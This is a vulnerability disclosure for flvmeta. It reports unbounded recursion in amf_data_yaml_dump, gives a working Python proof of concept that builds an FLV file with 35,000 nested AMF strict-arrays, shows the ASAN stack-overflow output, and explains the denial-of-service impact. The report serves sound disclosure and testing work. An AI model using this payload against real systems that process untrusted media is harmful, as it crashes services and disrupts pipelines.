## Bug0: Stack overflow via unbounded recursion in amf_data_yaml_dump

The function `amf_data_yaml_dump` in `dump_yaml.c` recursively processes every element of AMF_TYPE_ARRAY structures without any recursion depth limit, so a crafted FLV script tag with deeply nested strict-arrays exhausts the process stack and causes a fatal stack-overflow crash.

### PoC

Craft a malicious FLV file using the Python script below and process it with the ASAN-instrumented flvmeta binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_FILE = "poc_input.flv"
DEPTH = 35000

def build_amf_payload(depth):
    key = b"\x02" + struct.pack(">H", len("onMetaData")) + b"onMetaData"
    nested = b""
    for _ in range(depth):
        nested += b"\x0a" + struct.pack(">I", 1)
    leaf = b"\x00" + b"\x00" * 8
    return key + nested + leaf

def build_flv(payload_bytes):
    flv_header = b"FLV" + b"\x01" + b"\x05" + struct.pack(">I", 9)
    prev_tag_size_0 = struct.pack(">I", 0)
    tag_type = b"\x12"
    data_size = len(payload_bytes)
    data_size_bytes = struct.pack(">I", data_size)[1:]
    timestamp = b"\x00\x00\x00"
    timestamp_ext = b"\x00"
    stream_id = b"\x00\x00\x00"
    tag_header = tag_type + data_size_bytes + timestamp + timestamp_ext + stream_id
    tag = tag_header + payload_bytes
    prev_tag_size_1 = struct.pack(">I", 11 + data_size)
    return flv_header + prev_tag_size_0 + tag + prev_tag_size_1

payload = build_amf_payload(DEPTH)
flv_data = build_flv(payload)
with open(OUTPUT_FILE, "wb") as f:
    f.write(flv_data)
print(f"[+] Written {len(flv_data)} bytes to {OUTPUT_FILE}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/src/flvmeta poc_input.flv || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==1849691==ERROR: AddressSanitizer: stack-overflow on address 0x7ffd10232ff8 (pc 0x7ff31d8266c8 bp 0x000000000010 sp 0x7ffd10233000 T0)
    #0 0x7ff31d8266c8 in __asan::GetCurrentThread() ../../../../src/libsanitizer/asan/asan_thread.cpp:421
    #1 0x7ff31d78f43d in __asan::Allocator::Allocate(unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType, bool) ../../../../src/libsanitizer/asan/asan_allocator.cpp:533
SUMMARY: AddressSanitizer: stack-overflow ../../../../src/libsanitizer/asan/asan_thread.cpp:421 in __asan::GetCurrentThread()

### Impact

An attacker who supplies a crafted FLV file with approximately 35,000 levels of nested AMF strict-arrays can cause flvmeta to crash with SIGSEGV due to stack exhaustion, resulting in denial of service. The attack surface is any deployment where flvmeta processes untrusted FLV input, such as automated media transcoding or metadata extraction pipelines. No authentication or special privileges are required; a single malformed file reliably reproduces the crash.
